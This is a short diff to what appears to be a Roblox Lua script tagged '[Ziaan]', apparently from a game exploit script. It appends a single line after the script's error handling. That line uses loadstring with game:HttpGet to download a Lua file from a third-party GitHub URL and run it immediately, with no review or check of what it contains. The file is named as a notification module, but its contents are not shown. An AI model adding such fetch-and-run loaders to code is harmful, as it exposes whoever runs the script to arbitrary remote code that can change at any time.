@@ -61,3 +61,5 @@ end)
 if not success then
     warn("[Ziaan] Error executing script")
 end
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vexusware/vexusware.github.io/refs/heads/main/src/vexus/notif.lua"))()
